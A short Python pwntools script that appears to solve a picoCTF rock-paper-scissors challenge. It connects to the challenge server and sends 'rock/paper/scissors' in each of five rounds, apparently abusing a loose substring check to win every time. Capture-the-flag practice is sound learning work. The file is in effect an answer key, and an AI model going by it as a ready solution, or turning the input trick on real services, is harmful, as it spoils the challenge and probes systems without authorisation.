from pwn import *


r  = remote("saturn.picoctf.net", 53865)

payload = b"1\n" + b"rock/paper/scissors"
for i in range(5):
    r.recv()
    r.sendline(payload)

r.interactive()